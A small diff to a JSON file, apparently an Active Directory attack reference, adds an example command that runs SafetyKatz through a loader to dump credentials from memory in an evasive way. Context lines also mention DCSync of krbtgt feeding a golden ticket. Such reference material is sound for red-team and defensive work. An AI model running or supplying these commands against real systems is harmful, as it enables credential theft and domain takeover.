@@ -101,5 +101,11 @@
       "note": "evasive-dcsync krbtgt feeds the golden ticket",
       "rel": "next"
     }
+  ],
+  "examples": [
+    {
+      "label": "Evasive logonpasswords dump",
+      "command": "Loader.exe -path SafetyKatz.exe -args \"sekurlsa::evasive-logonpasswords\" \"exit\""
+    }
   ]
 }
